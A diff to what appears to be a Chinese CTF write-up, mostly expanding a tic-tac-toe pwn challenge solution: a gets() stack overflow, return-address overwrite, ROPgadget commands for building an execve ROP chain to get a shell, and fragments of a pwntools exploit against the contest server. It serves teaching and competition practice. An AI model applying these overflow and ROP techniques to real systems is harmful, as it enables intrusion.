@@ -12,8 +12,6 @@ docker pull 8b8d3c8324c7/stringtool
 sudo find /var/lib/docker -name flag.txt
 ```
 
-Windows 大概也可以这样罢
-
 ## 从零开始的记账工具人
 网上搜到一堆，试了几个没一个能用的，只好自己写了。
 ```
@@ -65,7 +63,7 @@ ida 一看主函数逻辑比较复杂，Shader 脚本看不懂。果断 x64dbg �
 
 rdx 是第二个参数，也就是 count
 
-正好看到 rdx 在 call 之前要左移两位，我们可以把这条指令修改为 sar rdx,3 这样 count 会再左移一位，就变成了原来的一半。
+正好看到 rdx 在 call 之前要右移两位，我们可以把这条指令修改为 sar rdx,3 这样 count 会再右移一位，就变成了原来的一半。
 
 ![pic](2.png)
 
@@ -128,9 +126,48 @@ exec('''print(     __import__('hashlib').sha256(("exec(" + "'"*3 + __import__('s
 ##  生活在博弈树上
 ~~只有我不知道 ROPgadget 可以自动生成 RopChain，又丢人了。~~
 
-推荐使用 gdb+pwndbg  调试，方便。
+### ~~第零问~~：
 
-先贴上 exp 脚本
+在这个 Minimax 算法下，先手的可以保证不输，后手的至多平局。
+
+### 第一问：
+
+看到程序源码，看到 ```gets``` 嗯？（察觉）
+
+input 变量那里还亲切的写上了 ```input is large and it will be ok.```  估计就是要利用这里的溢出了，可以采用 ROP 的思路。
+
+ida 分析，input 变量距离 rbp 为 0x90 字节，rbp+8 是返回地址，先确定把这个地址覆盖为 0x402551 也就是赢的地址。
+
+又看到输了以后才会执行 ret 指令，所以我们可以先下两步棋，在第三次输入的时候再带上 payload
+
+### 第二问：
+
+在第一问的flag中有提示要getshell，我边写边调试，手动构造了一个 ropchain。
+
+自动生成 ropchain：
+```
+ROPgadget --binary tictactoe --ropchain
+```
+寻找 gadget (以syscall为例)：
+```
+ROPgadget --binary tictactoe | grep syscall
+```
+找到地址再用 ida 到附近看看，确定从用哪个具体的地址。比如这里 ```0x000000000043e6ec : xor edi, edi ; syscall``` 其实 xor 是没用的，我们可以直接取下面 syscall 的地址 0x43E6EE
+
+### 另外的一些总结：
+
+ROP中填写参数的方法：
+```ROPgadget --binary tictactoe --only "pop|ret"|grep pop |grep rax```
+
+比如 ```0x000000000046f9d6 : pop rax ; pop rdx ; pop rbx ; ret```
+
+在 payload 中填上 0x46f9d6,59,0,0 就通过 pop 把 rax,rdx,rbx 分别设定为 59,0,0 了。
+
+读入字符串参数：
+
+一般是直接和 payload 发送过去，但是这个貌似返回的时候栈发生了变化，所以我用了 syscall read，写入到全局变量段 bss
+
+### exp 如下：
 ```
 from pwn import *
 
@@ -160,7 +197,7 @@ payload2 = (
 # c = process("./tictactoe")  # 64
 
 c = remote("202.38.93.111", 10141)
-c.sendline("[TOKEN]]")
+c.sendline("[TOKEN]")
 
 c.recvuntil("Your turn")
 c.sendline("(0,1)")
@@ -371,3 +408,5 @@ c.interactive()
 ![pic](0.png)
 
 math 不会，binary 也没做出多少，全靠运气来混分（
+
+考前预习也没啥效果的样子
